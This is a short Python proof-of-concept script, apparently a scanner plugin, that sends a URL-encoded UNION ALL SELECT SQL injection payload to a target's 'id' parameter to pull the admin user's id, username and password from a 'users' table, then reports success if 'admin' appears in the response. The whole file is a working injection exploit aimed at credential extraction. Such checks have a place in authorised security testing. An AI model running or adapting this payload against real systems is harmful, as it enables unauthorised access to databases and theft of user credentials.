__author__ = 'luhaoliang'

import requests
import re

def poc(target):
    target = "{}/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)".format(target)
    s = requests.get(target)
    if re.search("admin",s.content):
        return [1,"sql_inject"]
    else:
        return [0,"sql_inject"]
